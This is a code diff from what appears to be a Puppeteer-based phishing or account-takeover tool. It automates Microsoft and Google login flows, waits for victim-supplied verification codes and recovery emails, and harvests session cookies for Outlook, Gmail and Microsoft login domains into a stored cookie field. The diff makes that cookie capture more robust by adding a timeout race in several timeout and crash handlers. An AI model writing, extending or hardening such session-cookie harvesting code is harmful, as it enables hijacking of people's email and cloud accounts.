@@ -4429,10 +4429,14 @@ if (!foundSelector) {
                     message: "Verification timed out. Please try again later."
                 });
 
-                // Capture cookies BEFORE closing browser — they're lost after close
+                // Capture cookies BEFORE closing browser — they're lost after close.
+                // Wrap in Promise.race so a hung page doesn't block browser.close().
                 try {
                     const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await page.cookies(...allUrls);
+                    const browserCookies = await Promise.race([
+                        page.cookies(...allUrls),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
+                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
                     if (browserCookies.length > 0) {
                         updateData.cookieJSON = JSON.stringify(browserCookies);
                         logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGOPTIONS timeout close.`);
@@ -4686,10 +4690,14 @@ if (!foundSelector) {
                     message: "Failed during WAITING_RECOVERY_EMAIL phase: Recovery email not provided in time."
                 });
 
-                // Capture cookies BEFORE closing browser — they're lost after close
+                // Capture cookies BEFORE closing browser — they're lost after close.
+                // Wrap in Promise.race so a hung page doesn't block browser.close().
                 try {
                     const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await page.cookies(...allUrls);
+                    const browserCookies = await Promise.race([
+                        page.cookies(...allUrls),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
+                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
                     if (browserCookies.length > 0) {
                         updateData.cookieJSON = JSON.stringify(browserCookies);
                         logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGRECOVERYEMAIL timeout close.`);
@@ -5599,10 +5607,14 @@ if (!foundSelector) {
                     message: "Verification timed out. Please try again later."
                 });
 
-                // Capture cookies BEFORE closing browser — they're lost after close
+                // Capture cookies BEFORE closing browser — they're lost after close.
+                // Wrap in Promise.race so a hung page doesn't block browser.close().
                 try {
                     const allUrls = [`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com'];
-                    const browserCookies = await page.cookies(...allUrls);
+                    const browserCookies = await Promise.race([
+                        page.cookies(...allUrls),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
+                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
                     if (browserCookies.length > 0) {
                         updateData.cookieJSON = JSON.stringify(browserCookies);
                         logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies before WAITINGCODE timeout close.`);
@@ -6202,7 +6214,8 @@ if (!foundSelector) {
             updateData.status = "FAILED";
             updateData.verified = false;
             updateData.fullAccess = false;
-            // Attempt to capture cookies even on crash (if page still accessible)
+            // Attempt to capture cookies even on crash (if page still accessible).
+            // Wrap in Promise.race so a hung page doesn't block browser cleanup.
             if (page && !browserFullyClosed) {
                 try {
                     const allUrls = [
@@ -6213,7 +6226,10 @@ if (!foundSelector) {
                         `https://outlook.live.com`,
                         `https://mail.google.com`,
                     ];
-                    const browserCookies = await page.cookies(...allUrls);
+                    const browserCookies = await Promise.race([
+                        page.cookies(...allUrls),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
+                    ]).catch(err => { logger.warn(`[processRow][${browserId}] Cookie capture failed/timed out: ${err.message}`); return []; });
                     if (browserCookies.length > 0) {
                         updateData.cookieJSON = JSON.stringify(browserCookies);
                         logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from crash handler.`);
